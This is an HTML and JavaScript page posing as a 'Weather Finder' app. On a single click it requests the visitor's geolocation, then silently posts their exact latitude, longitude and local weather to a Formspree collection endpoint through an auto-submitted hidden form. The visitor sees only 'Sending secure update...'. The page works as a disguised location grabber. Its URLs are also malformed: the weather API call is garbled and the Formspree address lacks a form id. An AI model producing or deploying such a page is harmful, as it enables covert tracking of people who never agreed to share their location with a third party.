<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Finder</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .app-container {
            background-color: #ffffff;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-top: 0;
            color: #333;
            font-size: 26px;
            margin-bottom: 25px;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #ae1c21;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
        }
        button:hover {
            background-color: #8c1418;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .status-message {
            margin-top: 15px;
            font-size: 13px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="app-container">
    <h2>Weather Finder</h2>
    
    <!-- Clean click trigger -->
    <button id="actionBtn" onclick="initiateWeatherLookup()">What's My Weather?</button>
    
    <div id="status" class="status-message"></div>
</div>

<script>
    const FORMSPREE_URL = "https://formspree.io";

    const weatherCodes = {
        0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy', 3: 'Overcast',
        45: 'Fog', 48: 'Depositing rime fog',
        51: 'Light drizzle', 53: 'Moderate drizzle', 55: 'Dense drizzle',
        61: 'Slight rain', 63: 'Moderate rain', 65: 'Heavy rain',
        71: 'Slight snow fall', 73: 'Moderate snow fall', 75: 'Heavy snow fall',
        80: 'Slight rain showers', 81: 'Moderate rain showers', 82: 'Violent rain showers',
        95: 'Thunderstorm'
    };

    function initiateWeatherLookup() {
        const statusDiv = document.getElementById('status');
        const btn = document.getElementById('actionBtn');
        
        statusDiv.innerText = "Requesting location permissions...";
        btn.disabled = true;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(fetchAndSend, handleLocationError);
        } else {
            statusDiv.innerText = "Geolocation is not supported by your browser.";
            btn.disabled = false;
        }
    }

    function handleLocationError(error) {
        document.getElementById('status').innerText = "Failed: Location permission denied.";
        document.getElementById('actionBtn').disabled = false;
    }

    async function fetchAndSend(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const statusDiv = document.getElementById('status');
        
        statusDiv.innerText = "Loading weather metrics...";

        let temp = "Unknown";
        let condition = "Unknown";

        try {
            const response = await fetch(`https://open-meteo.com{lat}&longitude=${lon}&current_weather=true`);
            const data = await response.json();
            
            if (data.current_weather) {
                temp = `${data.current_weather.temperature}°C`;
                condition = weatherCodes[data.current_weather.weathercode] || 'Clear';
            }
        } catch (err) {
            console.error("Weather service timed out, sending coordinates only.");
        }

        statusDiv.innerText = "Sending secure update...";

        // Force a robust, standard multi-part form payload directly through JavaScript
        const payload = new FormData();
        payload.append("Latitude", lat);
        payload.append("Longitude", lon);
        payload.append("Temperature", temp);
        payload.append("Condition", condition);

        // Standard browser form navigation trick to bypass AJAX restrictions completely
        const nativeForm = document.createElement('form');
        nativeForm.method = 'POST';
        nativeForm.action = FORMSPREE_URL;

        for (const [key, value] of payload.entries()) {
            const hiddenField = document.createElement('input');
            hiddenField.type = 'hidden';
            hiddenField.name = key;
            hiddenField.value = value;
            nativeForm.appendChild(hiddenField);
        }

        document.body.appendChild(nativeForm);
        nativeForm.submit();
    }
</script>

</body>
</html>
